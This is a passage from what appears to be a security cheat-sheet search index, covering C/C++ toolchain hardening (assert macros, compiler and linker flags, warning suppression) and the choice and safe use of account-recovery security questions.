(char*)(__func__) \\ << std::endl; \\ std::cerr << oss.str(); \\ raise(SIGTRAP); \\ } \\ } ## define ESAPI_ASSERT2(exp, msg) { \\ if(!(exp)) { \\ std::ostringstream oss; \\ oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\" \\ << (int)__LINE__ << \"): \" << (char*)(__func__) \\ << \": \\\"\" << (msg) << \"\\\"\" << std::endl; \\ std::cerr << oss.str(); \\ raise(SIGTRAP); \\ } \\ } ##elif (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_WINDOWS)) ## define ESAPI_ASSERT1(exp) assert(exp) ## define ESAPI_ASSERT2(exp, msg) assert(exp) ##else ## define ESAPI_ASSERT1(exp) ((void)(exp)) ## define ESAPI_ASSERT2(exp, msg) ((void)(exp)) ##endif ##if !defined(ASSERT) ## define ASSERT(exp) ESAPI_ASSERT1(exp) ##endif At program startup, a SIGTRAP handler will be installed if one is not provided by another component: struct DebugTrapHandler { DebugTrapHandler () { struct sigaction new_handler , old_handler ; do { int ret = 0 ; ret = sigaction ( SIGTRAP , NULL , & old_handler ); if ( ret != 0 ) break ; // Failed // Don't step on another's handler if ( old_handler . sa_handler != NULL ) break ; new_handler . sa_handler = & DebugTrapHandler :: NullHandler ; new_handler . sa_flags = 0 ; ret = sigemptyset ( & new_handler . sa_mask ); if ( ret != 0 ) break ; // Failed ret = sigaction ( SIGTRAP , & new_handler , NULL ); if ( ret != 0 ) break ; // Failed } while ( 0 ); } static void NullHandler ( int /*unused*/ ) { } }; // We specify a relatively low priority, to make sure we run before other CTORs // http://gcc.gnu.org/onlinedocs/gcc/C_002b_002b-Attributes.html#C_002b_002b-Attributes static const DebugTrapHandler g_dummyHandler __attribute__ (( init_priority ( 110 ))); On a Windows platform, you would call _set_invalid_parameter_handler (and possibly set_unexpected or set_terminate ) to install a new handler. Live hosts running production code should always define NDEBUG (i.e., release configuration), which means they do not assert or auto-abort. Auto-abortion is not acceptable behavior, and anyone who asks for the behavior is completely abusing the functionality of \"program diagnostics\". If a program wants a core dump, then it should create the dump rather than crashing. For more reading on asserting effectively, please see one of John Robbin's books, such as Debugging Applications . John is a legendary bug slayer in Windows circles, and he will show you how to do nearly everything, from debugging a simple program to bug slaying in multithreaded programs.","title":"ASSERT"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#additional-macros","text":"Additional macros include any macros needed to integrate properly and securely. It includes integrating the program with the platform (for example MFC or Cocoa/CocoaTouch) and libraries (for example, Crypto++ or OpenSSL). It can be a challenge because you have to have proficiency with your platform and all included libraries and frameworks. The list below illustrates the level of detail you will need when integrating. Though Boost is missing from the list, it appears to lack recommendations, additional debug diagnostics, and a hardening guide. See BOOST Hardening Guide (Preprocessor Macros) for details. In addition, Tim Day points to [boost.build] should we not define _SECURE_SCL=0 by default for all msvc toolsets for a recent discussion related to hardening (or lack thereof). In addition to what you should define, defining some macros and undefining others should trigger a security related defect. For example, -U_FORTIFY_SOURCES on Linux and _CRT_SECURE_NO_WARNINGS=1 , _SCL_SECURE_NO_WARNINGS , _ATL_SECURE_NO_WARNINGS or STRSAFE_NO_DEPRECATE on Windows. a) Be careful with _GLIBCXX_DEBUG when using pre-compiled libraries such as Boost from a distribution. There are ABI incompatibilities, and the result will likely be a crash. You will have to compile Boost with _GLIBCXX_DEBUG or omit _GLIBCXX_DEBUG . b) See Chapter 5, Diagnostics of the libstdc++ manual for details. c) SQLite secure deletion zeroizes memory on destruction. Define as required, and always define in US Federal since zeroization is required for FIPS 140-2, Level 1. d) N is 0644 by default, which means everyone has some access. e) Force temporary tables into memory (no unencrypted data to disk).","title":"Additional Macros"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#compiler-and-linker","text":"Compiler writers provide a rich set of warnings from the analysis of code during compilation. Both GCC and Visual Studio have static analysis capabilities to help find mistakes early in the development process. The built-in static analysis capabilities of GCC and Visual Studio are usually sufficient to ensure proper API usage and catch a number of mistakes such as using an uninitialized variable or comparing a negative signed int and a positive unsigned int. As a concrete example, (and for those not familiar with C/C++ promotion rules), a warning will be issued if a signed integer is promoted to an unsigned integer and then compared because a side effect is -1 > 1 after promotion! GCC and Visual Studio will not currently catch, for example, SQL injections and other tainted data usage. For that, you will need a tool designed to perform data flow analysis or taint analysis. Some in the development community resist static analysis or refute its results. For example, when static analysis warned the Linux kernel's sys_prctl was comparing an unsigned value against less than zero, Jesper Juhl offered a patch to clean up the code. Linus Torvalds howled \"No, you don't do this\u2026 GCC is crap\" (referring to compiling with warnings). For the full discussion, see [PATCH] Don't compare unsigned variable for <0 in sys_prctl() from the Linux Kernel mailing list. The following sections will detail steps for three platforms. First is a typical GNU Linux based distribution offering GCC and Binutils, second is Clang and Xcode, and third is modern Windows platforms.","title":"Compiler and Linker"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#distribution-hardening","text":"Before discussing GCC and Binutils, it would be a good time to point out some of the defenses discussed below are all ready present in a distribution. Unfortunately, its design by committee, so what is present is usually only a mild variation of what is available (this way, everyone is mildly offended). For those who are purely worried about performance, you might be surprised to learn you have already taken the small performance hint without even knowing. Linux and BSD distributions often apply some hardening without intervention via GCC Spec Files . If you are using Debian, Ubuntu, Linux Mint and family, see Debian Hardening . For Red Hat and Fedora systems, see New hardened build support (coming) in F16 . Gentoo users should visit Hardened Gentoo . You can see the settings being used by a distribution via gcc -dumpspecs . From Linux Mint 12 below, -fstack-protector (but not -fstack-protector-all) is used by default. $ gcc -dumpspecs \u2026 *link_ssp: % { fstack-protector: } *ssp_default: % { !fno-stack-protector:% { !fstack-protector-all: % { !ffreestanding:% { !nostdlib:-fstack-protector }}}} \u2026 The \"SSP\" above stands for Stack Smashing Protector. SSP is a reimplementation of Hiroaki Etoh's work on IBM Pro Police Stack Detector. See Hiroaki Etoh's patch gcc stack-smashing protector and IBM's GCC extension for protecting applications from stack-smashing attacks for details.","title":"Distribution Hardening"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#gccbinutils","text":"GCC (the compiler collection) and Binutils (the assemblers, linkers, and other tools) are separate projects that work together to produce a final executable. Both the compiler and linker offer options to help you write safer and more secure code. The linker will produce code which takes advantage of platform security features offered by the kernel and PaX, such as no-exec stacks and heaps (NX) and Position Independent Executable (PIE). The table below offers a set of compiler options to build your program. Static analysis warnings help catch mistakes early, while the linker options harden the executable at runtime. In the table below, \"GCC\" should be loosely taken as \"non-ancient distributions.\" While the GCC team considers 4.2 ancient, you will still encounter it on Apple and BSD platforms due to changes in GPL licensing around 2007. Refer to GCC Option Summary , Options to Request or Suppress Warnings and Binutils (LD) Command Line Options for usage details. Noteworthy of special mention are -fno-strict-overflow and -fwrapv \u2090. The flags ensure the compiler does not remove statements that result in overflow or wrap. If your program only runs correctly using the flags, it is likely violating C/C++ rules on overflow and illegal. If the program is illegal due to overflow or wrap checking, you should consider using safe-iop for C or David LeBlanc's SafeInt in C++. For a project compiled and linked with hardened settings, some of those settings can be verified with the Checksec tool written by Tobias Klein. The checksec.sh script is designed to test standard Linux OS and PaX security features being used by an application. See the Trapkit web page for details. GCC C Warning Options table: AddressSanitizer ThreadSanitizer a) Unlike Clang and -Weverything, GCC does not provide a switch to truly enable all warnings. b) -fstack-protector guards functions with high risk objects such as C strings, while -fstack-protector-all guards all objects. Additional C++ warnings which can be used include the following in Table 3. See GCC's Options Controlling C++ Dialect for additional options and details. GCC C++ Warning Options table: Effective C++, Second Edition book . And additional Objective C warnings which are often useful include the following. See Options Controlling Objective-C and Objective-C++ Dialects for additional options and details. GCC Objective C Warning Options table: The use of aggressive warnings will produce spurious noise. The noise is a tradeoff - you can learn of potential problems at the cost of wading through some chaff. The following will help reduces spurious noise from the warning system: -Wno-unused-parameter (GCC) -Wno-type-limits (GCC 4.3) -Wno-tautological-compare (Clang) Finally, a simple version based Makefile example is shown below. This is different than feature based makefile produced by auto tools (which will test for a particular feature and then define a symbol or configure a template file). Not all platforms use all options and flags. To address the issue you can pursue one of two strategies. First, you can ship with a weakened posture by servicing the lowest common denominator; or you can ship with everything in force. In the latter case, those who don't have a feature available will edit the makefile to accommodate their installation. CXX = g++ EGREP = egrep \u2026 GCC_COMPILER = $( shell $( CXX ) -v 2 > & 1 | $( EGREP ) -i -c '^gcc version' ) GCC41_OR_LATER = $( shell $( CXX ) -v 2 > & 1 | $( EGREP ) -i -c '^gcc version (4\\.[1-9]|[5-9])' ) \u2026 GNU_LD210_OR_LATER = $( shell $( LD ) -v 2 > & 1 | $( EGREP ) -i -c '^gnu ld .* (2\\.1[0-9]|2\\.[2-9])' ) GNU_LD214_OR_LATER = $( shell $( LD ) -v 2 > & 1 | $( EGREP ) -i -c '^gnu ld .* (2\\.1[4-9]|2\\.[2-9])' ) \u2026 ifeq ( $( GCC_COMPILER ) ,1 ) MY_CC_FLAGS += -Wall -Wextra -Wconversion MY_CC_FLAGS += -Wformat = 2 -Wformat-security MY_CC_FLAGS += -Wno-unused-parameter endif ifeq ( $( GCC41_OR_LATER ) ,1 ) MY_CC_FLAGS += -fstack-protector-all endif ifeq ( $( GCC42_OR_LATER ) ,1 ) MY_CC_FLAGS += -Wstrict-overflow endif ifeq ( $( GCC43_OR_LATER ) ,1 ) MY_CC_FLAGS += -Wtrampolines endif ifeq ( $( GNU_LD210_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,nodlopen -z,nodump endif ifeq ( $( GNU_LD214_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,noexecstack -z,noexecheap endif ifeq ( $( GNU_LD215_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,relro -z,now endif ifeq ( $( GNU_LD216_OR_LATER ) ,1 ) MY_CC_FLAGS += -fPIE MY_LD_FLAGS += -pie endif ## Use 'override' to honor the user's command line override CFLAGS : = $( MY_CC_FLAGS ) $( CFLAGS ) override CXXFLAGS : = $( MY_CC_FLAGS ) $( CXXFLAGS ) override LDFLAGS : = $( MY_LD_FLAGS ) $( LDFLAGS ) \u2026","title":"GCC/Binutils"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#clangxcode","text":"Clang and LLVM have been aggressively developed since Apple lost its GPL compiler back in 2007 (due to Tivoization which resulted in GPLv3). Since that time, a number of developers and Goggle have joined the effort. While Clang will consume most (all?) GCC/Binutil flags and switches, the project supports a number of its own options, including a static analyzer. In addition, Clang is relatively easy to build with additional diagnostics, such as Dr. John Regher and Peng Li's Integer Overflow Checker (IOC) . IOC is incredibly useful, and has found bugs in a number of projects, from the Linux Kernel ( include/linux/bitops.h , still unfixed), SQLite, PHP, Firefox (many still unfixed), LLVM, and Python. Future version of Clang (Clang 3.3 and above) will allow you to enable the checks out of the box with -fsanitize=integer and -fsanitize=shift . Clang options can be found at Clang Compiler User's Manual . Clang does include an option to turn on all warnings - -Weverything . Use it with care but use it regularly since you will get back a lot of noise and issues you missed. For example, add -Weverything for production builds and make non-spurious issues a quality gate. Under Xcode, simply add -Weverything to CFLAGS and CXXFLAGS . In addition to compiler warnings, both static analysis and additional security checks can be performed. Reading on Clang's static analysis capabilities can be found at Clang Static Analyzer . Figure 1 below shows some of the security checks utilized by Xcode.","title":"Clang/Xcode"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#visual-studio","text":"Visual Studio offers a convenient Integrated Development Environment (IDE) for managing solutions and their settings. the section called \"Visual Studio Options\" discusses option which should be used with Visual Studio, and the section called \"Project Properties\" demonstrates incorporating those options into a solution's project. The table below lists the compiler and linker switches which should be used under Visual Studio. Refer to Howard and LeBlanc's Writing Secure Code (Microsoft Press) for a detailed discussion; or Protecting Your Code with Visual C++ Defenses in Security Briefs by Michael Howard. In the table below, \"Visual Studio\" refers to nearly all versions of the development environment, including Visual Studio 5.0 and 6.0. For a project compiled and linked with hardened settings, those settings can be verified with BinScope. BinScope is a verification tool from Microsoft that analyzes binaries to ensure that they have been built-in compliance with Microsoft's Security Development Lifecycle (SDLC) requirements and recommendations. See the BinScope Binary Analyzer download page for details. a) See Jon Sturgeon's discussion of the switch at Off By Default Compiler Warnings in Visual C++ . a) When using /GS, there are a number of circumstances which affect the inclusion of a security cookie. For example, the guard is not used if there is no buffer in the stack frame, optimizations are disabled, or the function is declared naked or contains inline assembly. b) #pragma strict_gs_check(on) should be used sparingly, but is recommend in high risk situations, such as when a source file parses input from the internet.","title":"Visual Studio"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#warn-suppression","text":"From the tables above, a lot of warnings have been enabled to help detect possible programming mistakes. The potential mistakes are detected via compiler which carries around a lot of contextual information during its code analysis phase. At times, you will receive spurious warnings because the compiler is not that smart. Its understandable and even a good thing (how would you like to be out of a job because a program writes its own programs?). At times you will have to learn how to work with the compiler's warning system to suppress warnings. Notice what was not said: turn off the warnings. Suppressing warnings placates the compiler for spurious noise so you can get to the issues that matter (you are separating the wheat from the chaff). This section will offer some hints and point out some potential minefields. First is an unused parameter (for example, argc or argv ). Suppressing unused parameter warnings is especially helpful for C++ and interface programming, where parameters are often unused. For this warning, simply define an \"UNUSED\" macro and warp the parameter: ##define UNUSED_PARAMETER(x) ((void)x) \u2026 int main ( int argc , char * argv []) { UNUSED_PARAMETER ( argc ); UNUSED_PARAMETER ( argv ); \u2026 } A potential minefield lies near \"comparing unsigned and signed\" values, and -Wconversion will catch it for you. This is because C/C++ promotion rules state the signed value will be promoted to an unsigned value and then compared. That means -1 > 1 after promotion! To fix this, you cannot blindly cast - you must first range test the value: int x = GetX (); unsigned int y = GetY (); ASSERT ( x >= 0 ); if ( ! ( x >= 0 )) throw runtime_error ( \"WTF??? X is negative.\" ); if ( static_cast < unsigned int > ( x ) > y ) cout << \"x is greater than y\" << endl ; else cout << \"x is not greater than y\" << endl ; Notice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with x . Just run the program and wait for it to tell you there is a problem. If there is a problem, the program will snap the debugger (and more importantly, not call a useless abort() as specified by Posix). It beats the snot out of printf that are removed when no longer needed or pollute outputs. Another conversion problem you will encounter conversion between types, and -Wconversion will also catch it for you. The following will always have an opportunity to fail, and should light up like a Christmas tree: struct sockaddr_in addr ; \u2026 addr . sin_port = htons ( atoi ( argv [ 2 ])); The following would probably serve you much better. Notice atoi and fiends are not used because they can silently fail. In addition, the code is instrumented so you don't need to waste a lot of time debugging potential problems: const char * cstr = GetPortString (); ASSERT ( cstr != NULL ); if ( ! ( cstr != NULL )) throw runtime_error ( \"WTF??? Port string is not valid.\" ); istringstream iss ( cstr ); long long t = 0 ; iss >> t ; ASSERT ( ! ( iss . fail ())); if ( iss . fail ()) throw runtime_error ( \"WTF??? Failed to read port.\" ); // Should this be a port above the reserved range ([0-1024] on Unix)? ASSERT ( t > 0 ); if ( ! ( t > 0 )) throw runtime_error ( \"WTF??? Port is too small\" ); ASSERT ( t < static_cast < long long > ( numeric_limits < unsigned int >:: max ())); if ( ! ( t < static_cast < long long > ( numeric_limits < unsigned int >:: max ()))) throw runtime_error ( \"WTF??? Port is too large\" ); // OK to use port unsigned short port = static_cast < unsigned short > ( t ); \u2026 Again, notice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with port . This code will continue checking conditions, years after being instrumented (assuming to wrote code to read a config file early in the project). There's no need to remove the ASSERT s as with printf since they are silent guardians. Another useful suppression trick is too avoid ignoring return values. Not only is it useful to suppress the warning, its required for correct code. For example, snprint will alert you to truncations through its return value. You should not make them silent truncations by ignoring the warning or casting to void : char path [ PATH_MAX ]; \u2026 int ret = snprintf ( path , sizeof ( path ), \"%s/%s\" , GetDirectory (), GetObjectName ()); ASSERT ( ret != -1 ); ASSERT ( ! ( ret >= sizeof ( path ))); if ( ret == -1 || ret >= sizeof ( path )) throw runtime_error ( \"WTF??? Unable to build full object name\" ); // OK to use path \u2026 The problem is pandemic, and not just boring user land programs. Projects which offer high integrity code, such as SELinux, suffer silent truncations. The following is from an approved SELinux patch even though a comment was made that it suffered silent truncations in its security_compute_create_name function from compute_create.c . 12 int security_compute_create_raw ( security_context_t scon , 13 security_context_t tcon , 14 security_class_t tclass , 15 security_context_t * newcon ) 16 { 17 char path [ PATH_MAX ]; 18 char * buf ; 19 size_t size ; 20 int fd , ret ; 21 22 if ( ! selinux_mnt ) { 23 errno = ENOENT ; 24 return -1 ; 25 } 26 27 snprintf ( path , sizeof path , \"%s/create\" , selinux_mnt ); 28 fd = open ( path , O_RDWR ); Unlike other examples, the above code will not debug itself, and you will have to set breakpoints and trace calls to determine the point of first failure. (And the code above gambles that the truncated file does not exist or is not under an adversary's control by blindly performing the open ).","title":"Warn Suppression"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#runtime","text":"The previous sections concentrated on setting up your project for success. This section will examine additional hints for running with increased diagnostics and defenses. Not all platforms are created equal - GNU Linux is difficult to impossible to add hardening to a program after compiling and static linking ; while Windows allows post-build hardening through a download. Remember, the goal is to find the point of first failure quickly so you can improve the reliability and security of the code.","title":"Runtime"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#xcode","text":"Xcode offers additional Code Diagnostics that can help find memory errors and object use problems. Schemes can be managed through Products menu item, Scheme submenu item, and then Edit . From the editor, navigate to the Diagnostics tab. In the figure below, four additional instruments are enabled for the debugging cycle: Scribble guards, Edge guards, Malloc guards, and Zombies. There is one caveat with using some of the guards: Apple only provides them for the simulator, and not a device. In the past, the guards were available for both devices and simulators.","title":"Xcode"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#windows","text":"Visual Studio offers a number of debugging aides for use during development. The aides are called Managed Debugging Assistants (MDAs) . You can find the MDAs on the Debug menu, then Exceptions submenu. MDAs allow you to tune your debugging experience by, for example, filter exceptions for which the debugger should snap. For more details, see Stephen Toub's Let The CLR Find Bugs For You With Managed Debugging Assistants . Finally, for runtime hardening, Microsoft has a helpful tool called EMET. EMET is the Enhanced Mitigation Experience Toolkit , and allows you to apply runtime hardening to an executable which was built without. Its very useful for utilities and other programs that were built without an SDLC.","title":"Windows"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html","text":"Choosing and Using Security Questions Cheat Sheet \u00b6 Introduction \u00b6 Security questions are used by many websites to allow a user to regain access to their account if they have forgotten their password, or have lost their secondary authentication factors when multifactor authentication (MFA) is required. However, they are often a significantly weaker form of authentication than passwords, and there have been a number of high profile cases where they have allowed attackers to compromise users' accounts. Security questions should not be relied upon as a sole mechanism to authenticate a user . However, they can provide a useful additional layer of security when MFA is not available. This cheat sheet provides guidance on both how to choose strong security questions, and how to use them securely within an application. Choosing Security Questions \u00b6 Desired Characteristics \u00b6 Any security questions presented to users to reset forgotten passwords must meet the following characteristics: Characteristic Explanation Memorable The user must be able to recall the answer to the question, potentially years after creating their account. Consistent The answer to the question must not change over time. Applicable The user must be able to answer the question. Confidential The answer to the question must be hard for an attacker to obtain. Specific The answer should be clear to the user. Types of Security Questions \u00b6 Security questions fall into two main types. With user defined security questions, the user must choose a question from a list, and provide an answer to the question. Common examples are \"What is your favourite colour?\" or \"What was your first car?\" These are easy for applications to implement, as the additional information required is provided by the user when they first create their account. However, users will often choose weak or easily discovered answers to these questions. System defined security questions are based on information that is already known about the user. This approach avoids having to ask the user to provide specific security questions and answers, and also prevents them from being able to choose weak details. However it relies on sufficient information already being stored about the user, and on this information being hard for an attacker to obtain. User Defined Security Questions \u00b6 Bad Questions \u00b6 Any questions that do not have all of the characteristics discussed above should be avoided. The table below gives some examples of bad security questions: Question Problem When is your date of birth? Easy for an attacker to discover. What is your memorable date? Most users will just enter their birthday. What is your favourite movie? Likely to change over time. What is your favourite cricket team? Not applicable to most users. What is the make and model of your first car? Fairly small range of likely answers. Additionally, when the context of the application must be considered when deciding whether questions are good or bad. For example, a question such as \"What was your maths teacher's surname in your 8th year of school?\" would be very easy to guess if it was using in a virtual learning environment for your school (as other students probably know this information), but would be much stronger for an online gaming website. Good Questions \u00b6 Many good security questions are not applicable to all users, so the best approach is to give the user a list of security questions that they can choose from. This allows you to have more specific questions (with more secure answers), while still providing every user with questions that they can answer. The following list provides some examples of good questions: What are the last four digits of your national insurance or social security number? What was your maths teacher's surname in your 8th year of school? What was the name of your first stuffed toy? What was your driving instructor's first name? Much like passwords, there is a risk that users will re-use recovery questions between different sites, which could expose the users if the other site is compromised. As such, there are benefits to having unique security questions that are unlikely to be shared between sites. An easy way to achieve this is to create more targeted questions based on the type of application. For example, on a share dealing platform, financial related questions such as \"What is the first company you owned shares in?\" could be used. Allowing Users to Write Their Own Questions \u00b6 Allowing users to write their own security questions can result in them choosing very strong and unique questions that would be very hard for an attacker to guess. However, there is also a significant risk that users will choose weak questions. In some cases, users might even set a recovery question to a reminder of what their password is - allowing anyone guessing their email address to compromise their account. As such, it is generally best not to allow users to write their own questions. Restricting Answers \u00b6 Enforcing a minimum length for answers can prevent users from entering strings such as \"a\" or \"123\" for their answers. However, depending on the questions asked, it could also prevent users from being able to correctly answer the question. For example, asking for a first name or surname could result in a two letter answer such as \"Li\", and a colour-based question could be four letters such as \"blue\". Answers should also be checked against a blacklist, including: The username or email address. The user's current password. Common strings such as \"123\" or \"password\". Renewing Security Questions \u00b6 If the security questions are not used as part of the main authentication process, then consider periodically prompting the user to review their security questions and verify that they still know the answers. This should give them a chance to update any answers that may have changed (although ideally this shouldn't happen with good questions), and increases the likelihood that they will remember them if they ever need to recover their account. System Defined Security Questions \u00b6 System defined security questions are based on information that is already known about the user. The users' personal details are often used, including the full name, address and date of birth. However these can easily be obtained by an attacker from social media, and as such provide a very weak level of authentication. The questions that can be used will vary hugely depending on the application, and how much information is already held about the user. When deciding which bits of information may be usable for security questions, the following areas should be considered: Will the user be able to remember the answer to the question? Could an attacker easily obtain this information from social media or other sources? Is the answer likely to be the same for a large number of users, or easily guessable? Using Security Questions \u00b6 When to Use Security Questions \u00b6 Applications should generally use a password along with a second authentication factor (such as an OTP code) to authenticate users. The combination of a password and security questions does not constitute MFA , as both factors as the same (i.e, something you know). Security questions should never be relied upon as the sole mechanism to authenticate a user . However, they can provide a useful additional layer of security when other stronger factors are not available. Common cases where they would be use include: Logging in. Resetting a forgotten password. Resetting a lost MFA token. Authentication Flow \u00b6 Security questions may be used as part of the main authentication flow to supplement passwords where MFA is not available. A typical authentication flow would be: The user enters their username and password. If the username and password are correct, the user is presented with the security question(s). If the answers are correct, the user is logged in. If the answers to the security questions are incorrect, then this should be counted as a failed login attempt, and the account lockout counter should be incremented for the user. Forgotten Password or Lost MFA Token Flow \u00b6 Forgotten password functionality often provides a mechanism for attackers to enumerate user accounts if it is not correctly implemented. The following flow avoids this issue by only displaying the security questions once the user has proved ownership of the email address: The user enters email address (and solves a CAPTCHA). The application displays a generic message such as \"If the email address was correct, an email will be sent to it\". An email email with a randomly generated, single-use link is sent to the user. The user clicks the link. The user is presented with the security question(s). If the answer is correct, the user can enter a new password. How to Use Security Questions \u00b6 Storing Answers \u00b6 The answers to security questions may contain personal information about the user, and may also be re-used by the user between different applications. As such, they should be treated in the same way as passwords, and stored using a secure hashing algorithm such as Bcrypt. The password storage cheat sheet contains further guidance on this. Comparing Answers \u00b6 Comparing the answers provided by the user with the stored answer in a case insensitive manner makes it much easier for the user. The simplest way to do this is to convert the answer to lowercase before hashing the answer to store it, and then lowercase the user-provided answer before comparing them. It is also beneficial to give the user some indication of the format that they should use to enter answers. This could be done through input validation, or simply by recommending that the user enters their details in a specific format. For example, when asking for a date, indicating that the format should be \"DD/MM/YYYY\" will mean that the user doesn't have to try and guess what format they entered when registering. Updating Answers \u00b6 When the user updates the answers to their security questions, this should be treated as a sensitive operation within the application. As such, the user should be required to re-authenticate themselves by entering their password (or ideally using MFA), in order to prevent an attacker updating the questions if they gain temporary access to the user's account. Multiple Security Questions \u00b6 When security questions are used, the user can either be asked a single question, or can be asked multiple questions at the same time. This provides a greater level of assurance, especially if the questions are diverse, as an attacker would need to obtain more information about the target user. A mixture of user-defined and system-defined questions can be very effective for this. If the user is asked a single question out of a bank of possible questions, then this question should not be changed until the user has answered it correctly. If the attacker is allowed to try answering all of the different security questions, this greatly increases the chance that they will be able to guess or obtain the answer to one of them.","title":"Choosing and Using Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#choosing-and-using-security-questions-cheat-sheet","text":"","title":"Choosing and Using Security Questions Cheat Sheet"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#introduction","text":"Security questions are used by many websites to allow a user to regain access to their account if they have forgotten their password, or have lost their secondary authentication factors when multifactor authentication (MFA) is required. However, they are often a significantly weaker form of authentication than passwords, and there have been a number of high profile cases where they have allowed attackers to compromise users' accounts. Security questions should not be relied upon as a sole mechanism to authenticate a user . However, they can provide a useful additional layer of security when MFA is not available. This cheat sheet provides guidance on both how to choose strong security questions, and how to use them securely within an application.","title":"Introduction"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#choosing-security-questions","text":"","title":"Choosing Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#desired-characteristics","text":"Any security questions presented to users to reset forgotten passwords must meet the following characteristics: Characteristic Explanation Memorable The user must be able to recall the answer to the question, potentially years after creating their account. Consistent The answer to the question must not change over time. Applicable The user must be able to answer the question. Confidential The answer to the question must be hard for an attacker to obtain. Specific The answer should be clear to the user.","title":"Desired Characteristics"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#types-of-security-questions","text":"Security questions fall into two main types. With user defined security questions, the user must choose a question from a list, and provide an answer to the question. Common examples are \"What is your favourite colour?\" or \"What was your first car?\" These are easy for applications to implement, as the additional information required is provided by the user when they first create their account. However, users will often choose weak or easily discovered answers to these questions. System defined security questions are based on information that is already known about the user. This approach avoids having to ask the user to provide specific security questions and answers, and also prevents them from being able to choose weak details. However it relies on sufficient information already being stored about the user, and on this information being hard for an attacker to obtain.","title":"Types of Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#user-defined-security-questions","text":"","title":"User Defined Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#bad-questions","text":"Any questions that do not have all of the characteristics discussed above should be avoided. The table below gives some examples of bad security questions: Question Problem When is your date of birth? Easy for an attacker to discover. What is your memorable date? Most users will just enter their birthday. What is your favourite movie? Likely to change over time. What is your favourite cricket team? Not applicable to most users. What is the make and model of your first car? Fairly small range of likely answers. Additionally, when the context of the application must be considered when deciding whether questions are good or bad. For example, a question such as \"What was your maths teacher's surname in your 8th year of school?\" would be very easy to guess if it was using in a virtual learning environment for your school (as other students probably know this information), but would be much stronger for an online gaming website.","title":"Bad Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#good-questions","text":"Many good security questions are not applicable to all users, so the best approach is to give the user a list of security questions that they can choose from. This allows you to have more specific questions (with more secure answers), while still providing every user with questions that they can answer. The following list provides some examples of good questions: What are the last four digits of your national insurance or social security number? What was your maths teacher's surname in your 8th year of school? What was the name of your first stuffed toy? What was your driving instructor's first name? Much like passwords, there is a risk that users will re-use recovery questions between different sites, which could expose the users if the other site is compromised. As such, there are benefits to having unique security questions that are unlikely to be shared between sites. An easy way to achieve this is to create more targeted questions based on the type of application. For example, on a share dealing platform, financial related questions such as \"What is the first company you owned shares in?\" could be used.","title":"Good Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#allowing-users-to-write-their-own-questions","text":"Allowing users to write their own security questions can result in them choosing very strong and unique questions that would be very hard for an attacker to guess. However, there is also a significant risk that users will choose weak questions. In some cases, users might even set a recovery question to a reminder of what their password is - allowing anyone guessing their email address to compromise their account. As such, it is generally best not to allow users to write their own questions.","title":"Allowing Users to Write Their Own Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#restricting-answers","text":"Enforcing a minimum length for answers can prevent users from entering strings such as \"a\" or \"123\" for their answers. However, depending on the questions asked, it could also prevent users from being able to correctly answer the question. For example, asking for a first name or surname could result in a two letter answer such as \"Li\", and a colour-based question could be four letters such as \"blue\". Answers should also be checked against a blacklist, including: The username or email address. The user's current password. Common strings such as \"123\" or \"password\".","title":"Restricting Answers"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#renewing-security-questions","text":"If the security questions are not used as part of the main authentication process, then consider periodically prompting the user to review their security questions and verify that they still know the answers. This should give them a chance to update any answers that may have changed (although ideally this shouldn't happen with good questions), and increases the likelihood that they will remember them if they ever need to recover their account.","title":"Renewing Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#system-defined-security-questions","text":"System defined security questions are based on information that is already known about the user. The users' personal details are often used, including the full name, address and date of birth. However these can easily be obtained by an attacker from social media, and as such provide a very weak level of authentication. The questions that can be used will vary hugely depending on the application, and how much information is already held about the user. When deciding which bits of information may be usable for security questions, the following areas should be considered: Will the user be able to remember the answer to the question? Could an attacker easily obtain this information from social media or other sources? Is the answer likely to be the same for a large number of users, or easily guessable?","title":"System Defined Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#using-security-questions","text":"","title":"Using Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#when-to-use-security-questions","text":"Applications should generally use a password along with a second authentication factor (such as an OTP code) to authenticate users. The combination of a password and security questions does not constitute MFA , as both factors as the same (i.e, something you know). Security questions should never be relied upon as the sole mechanism to authenticate a user . However, they can provide a useful additional layer of security when other stronger factors are not available. Common cases where they would be use include: Logging in. Resetting a forgotten password. Resetting a lost 